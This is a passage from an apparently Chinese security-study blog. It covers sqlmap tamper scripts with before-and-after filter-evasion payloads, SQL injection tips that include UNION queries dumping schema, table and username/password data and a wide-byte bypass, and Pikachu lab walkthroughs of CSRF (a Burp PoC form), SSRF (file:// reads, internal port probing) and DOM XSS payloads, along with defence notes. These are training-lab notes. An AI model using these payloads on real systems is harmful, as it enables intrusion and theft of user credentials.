<p>作用：从DBMS日志的自动模糊处理的有效载荷中追加sp_password。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 9227&#x3D;9227-</p>
<p>使用脚本后，语句为：</p>
<p>1 AND 9227&#x3D;9227–sp_password</p>
<p>● charencode.py</p>
<p>作用：对给定的Payload全部字符使用URL编码（不处理已经编码的字符）。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT FIELD FROM%20TABLE</p>
<p>使用脚本后，语句为：</p>
<p>%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</p>
<p>● randomcase.py</p>
<p>作用：随机大小写。</p>
<p>使用脚本前的语句为：</p>
<p>INSERT</p>
<p>使用脚本后，语句为：</p>
<p>InsERt</p>
<p>● charunicodeencode.py</p>
<p>作用：字符串unicode编码。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT FIELD%20FROM TABLE</p>
<p>使用脚本后，语句为：</p>
<p>%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020 %u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045</p>
<p>● space2comment.py</p>
<p>作用：将空格替换为&#x2F;**&#x2F;。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT id FROM users</p>
<p>使用脚本后，语句为：</p>
<p>SELECT&#x2F;<strong>&#x2F;id&#x2F;</strong>&#x2F;FROM&#x2F;**&#x2F;users</p>
<p>● equaltolike.py</p>
<p>作用：将等号替换为like。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT * FROM users WHERE id&#x3D;1</p>
<p>使用脚本后，语句为：</p>
<p>SELECT * FROM users WHERE id LIKE 1</p>
<p>● greatest.py</p>
<p>作用：绕过对“&gt;”的过滤，用GREATEST替换大于号。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND A &gt; B</p>
<p>使用脚本后，语句为：</p>
<p>1 AND GREATEST（A,B+1）&#x3D;A</p>
<p>测试通过的数据库类型和版本：</p>
<p>● MySQL 4、MySQL 5.0和MySQL 5.5</p>
<p>● Oracle 10g</p>
<p>● PostgreSQL 8.3、PostgreSQL 8.4和PostgreSQL 9.0</p>
<p>● ifnull2ifisnull.py</p>
<p>作用：绕过对IFNULL的过滤，替换类似IFNULL（A,B）为IF（ISNULL（A）,B,A）。</p>
<p>使用脚本前的语句为：</p>
<p>IFNULL（1,2）</p>
<p>使用脚本后，语句为：</p>
<p>IF（ISNULL（1）,2,1）</p>
<p>测试通过的数据库类型和版本为MySQL 5.0和MySQL 5.5。</p>
<p>● modsecurityversioned.py</p>
<p>作用：过滤空格，使用MySQL内联注释的方式进行注入。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 2&gt;1-</p>
<p>使用脚本后，语句为：</p>
<p>1 &#x2F;<em>!30874AND 2&gt;1</em>&#x2F;-</p>
<p>测试通过的数据库类型和版本为MySQL 5.0。</p>
<p>● space2mysqlblank.py</p>
<p>作用：将空格替换为其他空白符号（适用于MySQL）。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT id FROM users</p>
<p>使用脚本后，语句为：</p>
<p>SELECT%A0id%0BFROM%0Cusers</p>
<p>测试通过的数据库类型和版本为MySQL 5.1。</p>
<p>● modsecurityzeroversioned.py</p>
<p>作用：使用MySQL内联注释的方式（&#x2F;<em>!00000</em>&#x2F;）进行注入。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 2&gt;1-</p>
<p>使用脚本后，语句为：</p>
<p>1 &#x2F;<em>!00000AND 2&gt;1</em>&#x2F;-</p>
<p>测试通过的数据库类型和版本为MySQL 5.0。</p>
<p>● space2mysqldash.py</p>
<p>作用：将空格替换为–，并添加一个换行符。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 9227&#x3D;9227</p>
<p>使用脚本后，语句为：</p>
<p>1–%0AAND–%0A9227&#x3D;9227</p>
<p>● bluecoat.py</p>
<p>作用：在SQL语句之后用有效的随机空白符替换空格符，随后用LIKE替换等于号。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT id FROM users where id&#x3D;1</p>
<p>使用脚本后，语句为：</p>
<p>SELECT%09id FROM%09users WHERE%09id LIKE 1</p>
<p>测试通过的数据库类型和版本为MySQL 5.1和SGOS。</p>
<p>● versionedkeywords.py</p>
<p>作用：注释绕过。</p>
<p>使用脚本前的语句为：</p>
<p>UNION ALL SELECT NULL,NULL,CONCAT（CHAR（58,104,116,116,58）,IFNULL（CAST（CURRENT_USER（）AS CHAR）,CHAR（32））,CH&#x2F;**&#x2F;AR（58,100,114,117,58））#</p>
<p>使用脚本后，语句为：</p>
<p>&#x2F;<em>!UNION**!ALL**!SELECT</em><em>!NULL</em>&#x2F;,&#x2F;<em>!NULL</em>&#x2F;,CONCAT（CHAR（58,104,116,116,58）,IFNULL（CAST（CURRENT_USER（）&#x2F;<em>!AS</em><em>!CHAR</em>&#x2F;）,CHAR（32））,CHAR（58,100,114,117,58））#</p>
<p>● halfversionedmorekeywords.py</p>
<p>作用：当数据库为MySQL时绕过防火墙，在每个关键字之前添加MySQL版本注释。</p>
<p>使用脚本前的语句为：</p>
<p>value’ UNION ALL SELECT CONCAT（CHAR（58,107,112,113,58）,IFNULL（CAST （CURRENT_USER（）AS CHAR）,CHAR（32））,CHAR（58,97,110,121,58））,NULL,NULL# AND ‘QDWa’&#x3D;’QDWa</p>
<p>使用脚本后，语句为：</p>
<p>value’&#x2F;<em>!0UNION&#x2F;</em>!0ALL&#x2F;<em>!0SELECT&#x2F;</em>!0CONCAT（&#x2F;<em>!0CHAR（58,107,112,113,58）,&#x2F;</em>!0IFN ULL（CAST（&#x2F;<em>!0CURRENT_USER（）&#x2F;</em>!0AS&#x2F;<em>!0CHAR）,&#x2F;</em>!0CHAR（32））,&#x2F;<em>!0CHAR（58,97,110,121,5 8））,&#x2F;</em>!0NULL,&#x2F;<em>!0NULL#&#x2F;</em>!0AND’QDWa’&#x3D;’QDWa</p>
<p>测试通过的数据库类型和版本为MySQL 4.0.18和MySQL 5.0.22。</p>
<p>● space2morehash.py</p>
<p>作用：将空格替换为#号，并添加一个随机字符串和换行符。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 9227&#x3D;9227</p>
<p>使用脚本后，语句为：</p>
<p>1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23 lujYFWfv%0A9227&#x3D;9227</p>
<p>测试通过的数据库类型和版本为MySQL 5.1.41。</p>
<p>● apostrophenullencode.py</p>
<p>作用：用非法双字节unicode字符替换单引号。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND’1’&#x3D;’1</p>
<p>使用脚本后，语句为：</p>
<p>1 AND %00%271%00%27&#x3D;%00%271</p>
<p>● appendnullbyte.py</p>
<p>作用：在有效负荷的结束位置加载零字节字符编码。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 1&#x3D;1</p>
<p>使用脚本后，语句为：</p>
<p>1 AND 1&#x3D;1%00</p>
<p>● chardoubleencode.py</p>
<p>作用：对给定的Payload全部字符使用双重URL编码（不处理已经编码的字符）。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT FIELD FROM%20TABLE</p>
<p>使用脚本后，语句为：</p>
<p>%2553%2545%254c%2545%2543%2554%2520%2546%2549%2545%254c%2544%2520%2546%2552%25 4f%254d%2520%2554%2541%2542%254c%2545</p>
<p>● unmagicquotes.py</p>
<p>作用：用一个多字节组合（%bf%27）和末尾通用注释一起替换空格。</p>
<p>使用脚本前的语句为：</p>
<p>1’ AND 1&#x3D;1</p>
<p>使用脚本后，语句为：</p>
<p>1%bf%27-</p>
<p>● randomcomments.py</p>
<p>作用：用&#x2F;**&#x2F;分割SQL关键字。</p>
<p>使用脚本前的语句为：</p>
<p>INSERT</p>
<p>使用脚本后，语句为：</p>
<p>IN&#x2F;**&#x2F;S&#x2F;**&#x2F;ERT</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以平时要根据tamper规则自定义写，以面对复杂情况</p>
]]></content>
      <categories>
        <category>sqlmap使用</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>sqlmap使用</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入-tips</title>
    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/</url>
    <content><![CDATA[<h2 id="爆破语句"><a href="#爆破语句" class="headerlink" title="爆破语句"></a>爆破语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段</span><br></pre></td></tr></table></figure>

<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><strong>其实注释本来的作用也就是闭合语句</strong></p>
<p><strong>;%00</strong>代替–+进行注释</p>
<p>闭合就是针对输入的，一般会对输入的参数再加上一对单引号</p>
<h2 id="括号判断"><a href="#括号判断" class="headerlink" title="括号判断"></a>括号判断</h2><p>小括号判断：2’ and ‘1’&#x3D;’1 如果有括号，回显为id&#x3D;1页面</p>
<p>没括号则是id&#x3D;2页面</p>
<p><img src="/../../../Typora/img111/image-20230523131633798.png" alt="image-20230523131633798"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131638108.png" alt="image-20230523131638108"></p>
<h2 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h2><blockquote>
<p>union select绕过 ：&#x2F;<strong>&#x2F;UNION&#x2F;</strong>&#x2F;SELECT&#x2F;**&#x2F;</p>
</blockquote>
<blockquote>
<p>%75%6e%6f%69%6e %73%65%6c%65%63%74</p>
</blockquote>
<p>[SQL注入绕过关键词过滤的小技巧及原理（union select为例）_sql注入关键字过滤绕过_桑榆__的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request_id%22:%22167955372116800192238946%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955372116800192238946&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=union">https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request%5Fid%22%3A%22167955372116800192238946%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167955372116800192238946&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142^v76^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=union</a> select绕过&amp;spm&#x3D;1018.2226.3001.4187)</p>
<h3 id="空格、注释绕过"><a href="#空格、注释绕过" class="headerlink" title="空格、注释绕过"></a>空格、注释绕过</h3><p>空格绕过：%0B代替空格，括号绕过</p>
<p>注释绕过：用<strong>单引号闭合</strong>替代注释或者使用**;%00替代**。</p>
<p>例如:?id&#x3D;1’ union select 1,2,3 and ‘1’&#x3D;’1</p>
<h3 id="引号被注释"><a href="#引号被注释" class="headerlink" title="引号被注释"></a>引号被注释</h3><p><strong>闭合的用%df来（宽字节），字符串值处用16进制来</strong></p>
<p><strong>mysql_real_escape_string() 函数</strong></p>
<p>用来<a href="https://so.csdn.net/so/search?q=%E8%BD%AC%E4%B9%89&spm=1001.2101.3001.7020">转义</a> SQL 语句中使用的字符串中的特殊字符。如果成功，则该函数返回被转义的字符串(即在字符前加”&quot;)。如果失败，则返回 false。</p>
<h2 id="宽字节注入-df"><a href="#宽字节注入-df" class="headerlink" title="宽字节注入%df"></a>宽字节注入%df</h2><p><a href="https://blog.csdn.net/m0_63303407/article/details/127204281?ops_request_misc=%7B%22request_id%22:%22167955936416782427413061%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955936416782427413061&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-127204281-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">slilabs靶场记录宽字节绕过(七)_mysql_real_escape_string 绕过_wanan0red的博客-CSDN博客</a></p>
<ul>
<li>宽字节注入的本质是PHP与MySQL使用的字符集不同，只要低位的范围中含有0x5c的编码，就可以进行宽字节注入。</li>
<li>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</li>
</ul>
<p>预定义字符是：</p>
<ul>
<li>单引号（’）</li>
<li>双引号（”）</li>
<li>反斜杠（\）</li>
<li>NULL</li>
</ul>
<blockquote>
<p><code>uname=%df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=</code><strong>0x7365637572697479</strong>) #&amp;passwd&#x3D;1&amp;submit&#x3D;Submit (字符串附近的引号用%df不行，所以将值转化为十六进制，0x…)</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132005607.png" alt="image-20230523132005607"></p>
<h3 id="宽字节注入的防御："><a href="#宽字节注入的防御：" class="headerlink" title="宽字节注入的防御："></a>宽字节注入的防御：</h3><p><img src="/../../../Typora/img111/image-20230523132040435.png" alt="image-20230523132040435"></p>
<h3 id="limit-0-1"><a href="#limit-0-1" class="headerlink" title="limit 0,1"></a>limit 0,1</h3><p>[MySQL 分页查询limit性能缺陷和优化方案_limit性能问题_西瓜游侠的博客-CSDN博客](<a href="https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&request_id=&biz_id=102&utm_term=mysql">https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=mysql</a> limit漏洞&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-2-117190087.142^v80^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
<p><code>limit m,n</code></p>
<p>其中，m是偏移量，n是要查询的数量。</p>
<blockquote>
<p>当偏移量m过大的时候，查询效率会很低。因为MySQL是先查出m+n个数据，然后抛弃掉前m个数据。</p>
</blockquote>
<p><strong>limit 0,1从第一行开始，返回一行</strong></p>
<p><strong>limit 1,1从第二行开始，返回一行</strong></p>
<p><strong>limit 2,1从第三行开始，返回一行</strong></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132214461.png" alt="image-20230523132214461"></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132219086.png" alt="image-20230523132219086"></p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
<li><p>参数化查询（数据库服务器在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中含有有损的指令，也不会被数据库所运行，仅认为它是一个参数。），最好设定传入参数类型，比如是否是数字，<strong>is_numeric($_GET[‘id’])</strong> ，这样就限制了字符的输入。</p>
</li>
<li><p>参数长度限制，在PHP下，可用strlen函数检查输入长度</p>
</li>
<li><p>函数过滤转义，如addslashes()，它转义一些特殊字符</p>
</li>
<li><p>预编译语句，即将要执行的sql语句固定下来，将所传入的参数绑定为一个变量，用”?”表示。</p>
<p><code>query=&quot;select password from users where username=&#39;admin&#39; or 1=1 &quot;;</code></p>
<p>这样的话，<strong>admin’ or 1&#x3D;1</strong> 将作为username的值，避免了sql语句的拼接闭合等非法操作。</p>
</li>
</ol>
<p>危险参数过滤：</p>
<p>1）黑名单过滤：将一些可能用于注入的敏感字符写入黑名单中，如’（单引号）、union、select等，也可能使用正则表达式做过滤，但黑名单可能会有疏漏。</p>
<p>2）白名单过滤：例如，用数据库中的已知值校对，通常对参数结果进行合法性校验，符合白名单的数据方可显示。</p>
<p>3）参数转义：对变量默认进行addsalashes（在预定义字符前添加反斜杠），使得SQL注入语句构造失败。</p>
<p>由于白名单方式要求输出参数有着非常明显的特点，因此适用的业务场景非常有限。总体来说，防护手段仍建议以黑名单+参数转义方式为主，这也是目前针对SQL敏感参数处理的主要方式，以下逐项进行分析。</p>
]]></content>
      <categories>
        <category>web漏洞</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>Mysql爆破语句</tag>
        <tag>注入绕过</tag>
        <tag>sql注入技巧</tag>
        <tag>sql注入防御</tag>
      </tags>
  </entry>
  <entry>
    <title>pikachu</title>
    <url>/2023/05/21/pikachu/</url>
    <content><![CDATA[<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF:"></a>CSRF:</h2><h3 id="get型"><a href="#get型" class="headerlink" title="get型"></a>get型</h3><p>先登录用户，比如lili</p>
<p>通过bp或者f12网络知道了url的修改信息有关参数。</p>
<p><code>/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=18235&amp;add=usa&amp;email=lili%40pikachu.com&amp;submit=submit</code></p>
<p>切换用户如lucy</p>
<p>在lucy的登录后的页面上，url复制上述lili时的参数，回车。</p>
<p>发现lucy的信息被改为lili的了</p>
<h3 id="post型"><a href="#post型" class="headerlink" title="post型"></a>post型</h3><p>登录kobe用户，</p>
<blockquote>
<p>姓名:kobe</p>
<p>性别:boy</p>
<p>手机:15988767673</p>
<p>住址:nba lakes</p>
<p>邮箱:<a href="mailto:&#x6b;&#111;&#x62;&#101;&#x40;&#x70;&#x69;&#107;&#x61;&#x63;&#104;&#x75;&#x2e;&#x63;&#111;&#109;">&#x6b;&#111;&#x62;&#101;&#x40;&#x70;&#x69;&#107;&#x61;&#x63;&#104;&#x75;&#x2e;&#x63;&#111;&#109;</a></p>
</blockquote>
<p>通过bp抓包，右键工具菜单，生成csrf poc，复制写好的表单html文件，放到同文件夹下(csrfpost\)，记为test.html。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:81/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;15988767673&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;nba<span class="symbol">&amp;#32;</span>lakes&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;kobe<span class="symbol">&amp;#64;</span>pikachu<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>若用户访问该文件，则攻击完成。kobe用户的性别会被改变为girl。</p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h4 id="增加Token验证（常用做法）"><a href="#增加Token验证（常用做法）" class="headerlink" title="增加Token验证（常用做法）"></a>增加Token验证（常用做法）</h4><p>对关键操作增加Token参数，token必须随机，每次都不一样</p>
<h4 id="关于安全的会话管理（避免会话被利用）"><a href="#关于安全的会话管理（避免会话被利用）" class="headerlink" title="关于安全的会话管理（避免会话被利用）"></a>关于安全的会话管理（避免会话被利用）</h4><ol>
<li>不要在客户端保存敏感信息（比如身份验证信息）</li>
<li>退出、关闭浏览器时的会话过期机制</li>
<li>设置会话过机制，比如15分钟无操作，则自动登录超时</li>
</ol>
<h4 id="访问控制安全管理"><a href="#访问控制安全管理" class="headerlink" title="访问控制安全管理"></a>访问控制安全管理</h4><ol>
<li>敏感信息的修改时需要身份进行二次认证，比如修改账号密码，需要判断旧密码</li>
<li>敏感信息的修改使用POST，而不是GET</li>
<li>通过HTTP头部中的REFERER来限制原页面</li>
</ol>
<h4 id="增加验证码"><a href="#增加验证码" class="headerlink" title="增加验证码"></a>增加验证码</h4><p>一般在登录（防暴力破解），也可以用在其他重要信息操作的表单中（需要考虑可用性）<br>————————————————<br>版权声明：本文为CSDN博主「玉米同学」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_50339832/article/details/117606870">https://blog.csdn.net/weixin_50339832/article/details/117606870</a></p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF:"></a>SSRF:</h2><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h3><p>服务端<strong>提供了从其他服务器应用获取数据的功能</strong>,但又没有对目标地址做严格过滤与限制</p>
<p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p>
<p>数据流:攻击者—–&gt;服务器—-&gt;目标地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>

<h3 id="前期准备："><a href="#前期准备：" class="headerlink" title="前期准备："></a>前期准备：</h3><p>这里要开高版本php，5.3版本进入ssrf会报错。</p>
<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><p>页面所在路径为：</p>
<p><code>http://localhost:81/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:81/pikachu/vul/ssrf/ssrf_info/info1.php</code></p>
<p>1.在ssrf_info文件夹下新建一个1.php文件</p>
<p>内容为：</p>
<blockquote>
<?php

   echo "\<script>alert(document.cookie)\</script>";

?>
</blockquote>
<p>2.利用file伪协议，访问host文件</p>
<p><code>http://localhost:81/pikachu/vul/ssrf/ssrf_curl.php?url=file://C:\Windows\System32\drivers\etc\hosts</code></p>
<p>3.利用http协议，获取内网端口信息</p>
<p><code>?url=http://127.0.0.1:3306</code></p>
<h4 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content:"></a>file_get_content:</h4><p>对本地和远程的文件进行读取，把整个文件读入一个字符串中。(**file_get_contents()**只能通过GET方式获得数据。curl()可以进行DNS缓存，同一资源只需查询一次。更加快速且稳定，但配置较为麻烦，适合访问量大的应用)</p>
<p>主要是访问文件用的，file&#x3D;file:&#x2F;&#x2F;…。</p>
<h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>   1.做好对目标地址的过滤。使用DNS缓存或者Host白名单的方式。解析出要请求的地址所对应的 IP，如果这个 IP 是内网 IP 的话，就必须拒绝这次请求。</p>
<ol start="2">
<li>限制可以请求的协议，通常只允许 http&#x2F;https 协议，避免被利用file，gopher等协议。</li>
</ol>
<p>   3.限制可以请求的端口号，通常情况下，http 协议只允许 80 端口访问；https 协议只允许 443 端口访问。</p>
<p>————————————————<br>版权声明：本文为CSDN博主「发奋的鼹鼠」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_43660551/article/details/124809230">https://blog.csdn.net/qq_43660551/article/details/124809230</a></p>
<h2 id="Dom型xss"><a href="#Dom型xss" class="headerlink" title="Dom型xss:"></a>Dom型xss:</h2><p>DOM即文档对象模型，当一个页面被创建好，并加载到浏览器时，DOM就会把网页文档转化为一个文档对象，在这个文档对象中，会出现一个倒树的层次结构。</p>
<p>假如有这么一段html代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>文档标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>&gt;</span>我的链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>文档对象模型所基于的文档视图结构为：</p>
<p><img src="/../../../Typora/img111/image-20230530131755990.png" alt="image-20230530131755990"></p>
<p><strong>把DOM理解为JS访问HTML的标准编程接口。DOM是纯前端的操作</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">domxss</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;text&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dom&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+str+<span class="string">&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>易得，输入框中输入的便是str。</p>
<p>故构造payload</p>
<p><code>&#39; onclick=&quot;alert(1)&quot;&gt;</code></p>
<p>即有<code>&lt;a href=’ ‘ onclick=&quot;alert(1)&quot;&gt;</code></p>
<h2 id="php反序列化："><a href="#php反序列化：" class="headerlink" title="php反序列化："></a>php反序列化：</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>php中serialize()，unserialize()</p>
<p><strong>反序列化unserialize()</strong>:将一个对象变为可传输的字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class S&#123;</span><br><span class="line">    public $test=&quot;pikachu&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$s=new S(); //创建一个对象</span><br><span class="line">serialize($s); //把这个对象进行序列化</span><br><span class="line">序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span><br><span class="line">    O:代表object</span><br><span class="line">    1:代表对象名字长度为一个字符</span><br><span class="line">    S:对象的名称</span><br><span class="line">    1:代表对象里面有一个变量</span><br><span class="line">    s:数据类型</span><br><span class="line">    4:变量名称的长度</span><br><span class="line">    test:变量名称</span><br><span class="line">    s:数据类型</span><br><span class="line">    7:变量值的长度</span><br><span class="line">    pikachu:变量值</span><br></pre></td></tr></table></figure>

<p><strong>反序列化unserialize()</strong>:将被序列化的字符串还原为对象</p>
